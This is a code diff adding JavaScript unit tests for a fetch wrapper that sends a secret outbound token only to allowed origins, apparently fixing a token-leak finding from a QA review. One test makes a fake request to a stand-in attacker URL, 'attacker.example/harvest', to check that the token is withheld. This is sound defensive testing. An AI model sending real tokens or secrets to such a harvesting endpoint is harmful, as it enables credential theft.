@@ -9,6 +9,7 @@ const {
   createPinnedFetch,
   resolveSafeAddresses,
   mergeOutboundTokenHeader,
+  wrapFetchWithOutboundToken,
   SSRF_BLOCKED_CODE,
   OUTBOUND_TOKEN_HEADER_NAME,
 } = require('../../lib/net/pinnedFetch');
@@ -175,6 +176,66 @@ describe('mergeOutboundTokenHeader (sprint 7, requirement 1/2)', () => {
   test('omits the header for an empty-string token too', () => {
     const headers = mergeOutboundTokenHeader({ 'User-Agent': 'TestBot/1.0' }, '');
     assert.ok(!(OUTBOUND_TOKEN_HEADER_NAME in headers));
+  });
+});
+
+describe('wrapFetchWithOutboundToken (sprint 7 fix-loop, QA1 round 1 finding A)', () => {
+  function fakeFetch() {
+    const calls = [];
+    const impl = async (url, init) => {
+      calls.push({ url, init });
+      return { status: 200 };
+    };
+    impl.calls = calls;
+    return impl;
+  }
+
+  test('adds the header when the URL is within allowedOrigins', async () => {
+    const inner = fakeFetch();
+    const wrapped = wrapFetchWithOutboundToken(inner, 'the-token', new Set(['https://staging.test']));
+    await wrapped('https://staging.test/sitemap.xml', { headers: { 'User-Agent': 'x' } });
+    assert.equal(inner.calls[0].init.headers[OUTBOUND_TOKEN_HEADER_NAME], 'the-token');
+  });
+
+  test('does NOT add the header when the URL is outside allowedOrigins — the exploit QA1 demonstrated', async () => {
+    const inner = fakeFetch();
+    const wrapped = wrapFetchWithOutboundToken(inner, 'the-token', new Set(['https://staging.test']));
+    await wrapped('https://attacker.example/harvest', { headers: { 'User-Agent': 'x' } });
+    assert.ok(
+      !(OUTBOUND_TOKEN_HEADER_NAME in (inner.calls[0].init.headers || {})),
+      'the token must never reach a host outside the allowed origins'
+    );
+  });
+
+  test('a URL outside allowedOrigins is still fetched — only the secret is withheld, not the request', async () => {
+    const inner = fakeFetch();
+    const wrapped = wrapFetchWithOutboundToken(inner, 'the-token', new Set(['https://staging.test']));
+    await wrapped('https://cdn.thirdparty.example/asset.js', {});
+    assert.equal(inner.calls.length, 1, 'the underlying fetch must still be called');
+    assert.equal(inner.calls[0].url, 'https://cdn.thirdparty.example/asset.js');
+  });
+
+  test('a scheme/port change counts as a different origin — a downgraded or re-pointed hop does not carry the token', async () => {
+    const inner = fakeFetch();
+    const wrapped = wrapFetchWithOutboundToken(inner, 'the-token', new Set(['https://staging.test']));
+    await wrapped('http://staging.test/sitemap.xml', {}); // scheme differs
+    assert.ok(!(OUTBOUND_TOKEN_HEADER_NAME in (inner.calls[0].init.headers || {})));
+  });
+
+  test('multiple allowed origins (live AND staging) both carry the token', async () => {
+    const inner = fakeFetch();
+    const allowed = new Set(['https://live.test', 'https://staging.test']);
+    const wrapped = wrapFetchWithOutboundToken(inner, 'the-token', allowed);
+    await wrapped('https://live.test/a/', {});
+    await wrapped('https://staging.test/b/', {});
+    assert.equal(inner.calls[0].init.headers[OUTBOUND_TOKEN_HEADER_NAME], 'the-token');
+    assert.equal(inner.calls[1].init.headers[OUTBOUND_TOKEN_HEADER_NAME], 'the-token');
+  });
+
+  test('when no token is configured, fetchImpl is returned completely unwrapped regardless of allowedOrigins', () => {
+    const inner = fakeFetch();
+    const wrapped = wrapFetchWithOutboundToken(inner, undefined, new Set(['https://staging.test']));
+    assert.equal(wrapped, inner);
   });
 });
 
